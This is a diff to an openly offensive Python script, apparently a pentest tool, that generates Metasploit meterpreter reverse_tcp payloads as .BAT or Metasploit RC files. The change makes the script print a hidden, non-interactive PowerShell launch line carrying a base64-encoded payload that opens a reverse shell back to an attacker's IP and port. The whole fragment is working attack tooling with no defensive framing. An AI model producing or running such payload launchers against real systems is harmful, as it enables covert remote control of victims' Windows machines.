@@ -1,7 +1,8 @@
 #!/usr/bin/python
 #Powershell Encoded Command Generator
 #Written by Ben Buchacher bcbuchacher [ at ] gmail.com
-import os, sys, optparse, base64, subprocess, re, textwrap
+
+import os, sys, optparse, base64, subprocess, re
 from optparse import OptionGroup
 
 G  = "\033[32m"; # green
@@ -162,10 +163,12 @@ if __name__=="__main__":
           print G+"[INFO] Generating .BAT Payload" +N
           generate_batfile(x64PORT,x86PORT,powershell_command)
           print G+"[INFO] .BAT payload written to ./x64_payload.bat" +N 
-        if MSFRC == True:
-          print G+"[INFO] Generating Metasploit RC File" +N
-          generate_msfrc(IP,x64PORT,x86PORT)
-          print G+"[INFO] Metasploit RC File written to ./msf_x64.rc" +N
+        elif MSFRC == True:
+            print G+"[INFO] Generating Metasploit RC File" +N
+            generate_msfrc(IP,x64PORT,x86PORT)
+            print G+"[INFO] Metasploit RC File written to ./msf_x64.rc" +N
+        else:
+          print "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command
       if x86PORT != '0000':
         print G+"[INFO] Generating payload windows/meterpreter/reverse_tcp IP:"+ IP + " Port:" + x86PORT +N
         port = x86PORT
@@ -174,9 +177,11 @@ if __name__=="__main__":
           print G+"[INFO] Generating .BAT Payload" +N
           generate_batfile(x64PORT,x86PORT,powershell_command)
           print G+"[INFO] .BAT payload written to ./x86_payload.bat" +N
-        if MSFRC == True: 
+        elif MSFRC == True: 
           print G+"[INFO] Generating Metasploit RC File" +N
           generate_msfrc(IP,x64PORT,x86PORT)
           print G+"[INFO] Metasploit RC File written to ./msf_x86.rc" +N
+        else:
+          print "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command
       print G+"[DONE] Finished " +N
       sys.exit(1)
